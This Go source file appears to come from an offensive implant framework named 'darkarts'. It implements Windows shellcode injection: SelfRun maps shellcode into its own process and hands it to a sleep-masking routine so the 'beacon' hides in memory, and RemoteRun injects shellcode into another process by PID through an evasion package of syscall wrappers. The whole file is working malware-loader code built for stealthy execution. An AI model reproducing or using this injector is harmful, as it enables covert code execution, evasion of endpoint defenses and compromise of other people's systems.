//go:build windows && amd64 && inject

package inject

import (
	"errors"

	"darkarts/pkg/evasion"
	"darkarts/pkg/sleepmask"
)

const (
	memCommit   = 0x3000
	memRelease  = 0x8000
	pageRW      = 0x04
	pageRX      = 0x20
	waitTimeout = 0x102
	stillActive = 0x103
)

func freeOnErr(process, addr uintptr, err error) error {
	evasion.FreeVirtualMemory(process, addr)
	return err
}

// SelfRun maps the shellcode into the current process and starts a thread.
// The buffer intentionally leaks after creation: the thread starts
// asynchronously, and releasing the pages early would make it execute freed
// memory (access violation).
func SelfRun(sc []byte) (*Result, error) {
	if len(sc) == 0 {
		return nil, errors.New("inject: empty shellcode")
	}
	addr, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, uintptr(len(sc)), pageRW)
	if err != nil {
		return nil, err
	}
	if err := evasion.WriteVirtualMemory(evasion.CurrentProcess, addr, sc); err != nil {
		return nil, freeOnErr(evasion.CurrentProcess, addr, err)
	}
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, addr, uintptr(len(sc)), pageRX); err != nil {
		return nil, freeOnErr(evasion.CurrentProcess, addr, err)
	}
	if _, err := evasion.CreateThreadEx(evasion.CurrentProcess, addr, 0); err != nil {
		return nil, freeOnErr(evasion.CurrentProcess, addr, err)
	}
	// The buffer leaks on purpose; hand it to the sleep masker so the
	// shellcode is XORed and page-protected while the beacon sleeps.
	sleepmask.MaskSelfRegion(addr, uintptr(len(sc)), pageRX)
	return &Result{Mode: "self", Bytes: len(sc)}, nil
}

// RemoteRun maps the shellcode into the target process and waits for the
// thread to finish before releasing the buffer, so the target only loses the
// allocation if the thread never completes (timeout leaks it on purpose).
func RemoteRun(sc []byte, pid uint32) (*Result, error) {
	if len(sc) == 0 {
		return nil, errors.New("inject: empty shellcode")
	}
	h, err := evasion.OpenProcess(pid)
	if err != nil {
		return nil, err
	}
	defer evasion.Close(h)
	addr, err := evasion.AllocateVirtualMemory(h, uintptr(len(sc)), pageRW)
	if err != nil {
		return nil, err
	}
	if err := evasion.WriteVirtualMemory(h, addr, sc); err != nil {
		return nil, freeOnErr(h, addr, err)
	}
	if _, err := evasion.ProtectVirtualMemory(h, addr, uintptr(len(sc)), pageRX); err != nil {
		return nil, freeOnErr(h, addr, err)
	}
	t, err := evasion.CreateThreadEx(h, addr, 0)
	if err != nil {
		return nil, freeOnErr(h, addr, err)
	}
	defer evasion.Close(t)
	w, err := evasion.WaitForSingleObject(t, 30000)
	if err != nil {
		return nil, freeOnErr(h, addr, err)
	}
	if w == waitTimeout {
		return nil, errors.New("inject: wait timeout")
	}
	code, err := evasion.QueryThreadExitCode(t)
	if err != nil {
		return nil, freeOnErr(h, addr, err)
	}
	if code == stillActive {
		return nil, errors.New("inject: thread still active")
	}
	evasion.FreeVirtualMemory(h, addr)
	return &Result{Mode: "remote", Bytes: len(sc), PID: pid, ExitCode: code}, nil
}
